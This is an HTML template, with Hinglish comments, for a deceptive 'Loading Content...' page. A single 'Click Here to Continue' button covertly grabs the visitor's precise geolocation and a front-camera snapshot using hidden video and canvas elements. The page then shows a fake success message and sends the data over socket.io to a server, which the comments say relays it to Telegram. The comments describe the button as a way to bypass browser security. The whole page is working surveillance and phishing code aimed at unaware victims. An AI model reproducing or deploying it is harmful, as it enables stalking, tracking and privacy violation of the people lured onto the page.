<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading Content...</title>
    <style>
        body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background-color: #f0f2f5; margin: 0; }
        #action-btn { padding: 15px 30px; font-size: 18px; color: #fff; background-color: #007bff; border: none; border-radius: 8px; cursor: pointer; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
        #message { display: none; font-size: 24px; font-weight: bold; color: #28a745; }
        video { display: none; }
        canvas { display: none; }
    </style>
</head>
<body>

    <!-- Ye button browser security ko bypass karega -->
    <button id="action-btn" onclick="startProcess()">Click Here to Continue</button>
    
    <!-- Button dabne ke baad ye success message dikhega -->
    <div id="message">Loaded successfully!</div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        const sessionId = '<%= sessionId %>';
        const mode = '<%= mode %>';
        
        // Room join karna tere server.js ke hisaab se
        socket.emit('join-room', sessionId);

        async function startProcess() {
            // Button chhupao aur message dikhao
            document.getElementById('action-btn').style.display = 'none';
            document.getElementById('message').style.display = 'block';

            let dataToSend = { roomId: sessionId, latitude: 0, longitude: 0, accuracy: 0, image: '' };

            // 📍 1. LOCATION CAPTURE KAREGA
            if (mode === 'location' || mode === 'both') {
                try {
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true });
                    });
                    dataToSend.latitude = position.coords.latitude;
                    dataToSend.longitude = position.coords.longitude;
                    dataToSend.accuracy = position.coords.accuracy;
                } catch (err) {
                    console.error("Location block ki gayi ya fail hui:", err);
                }
            }

            // 📸 2. CAMERA CAPTURE KAREGA
            if (mode === 'camera' || mode === 'both') {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                    const video = document.getElementById('video');
                    const canvas = document.getElementById('canvas');
                    
                    video.srcObject = stream;
                    await new Promise(resolve => video.onloadedmetadata = resolve);
                    video.play();

                    // Camera focus hone ke liye 1 second wait karega
                    await new Promise(resolve => setTimeout(resolve, 1000));

                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                    dataToSend.image = canvas.toDataURL('image/png');

                    // Photo lene ke baad camera band kar dega
                    stream.getTracks().forEach(track => track.stop());
                } catch (err) {
                    console.error("Camera block kiya gaya ya fail hua:", err);
                }
            }

            // 🚀 3. DATA SERVER/TELEGRAM KO BHEJEGA
            socket.emit('tracker-data', dataToSend);
        }
    </script>
</body>
</html>

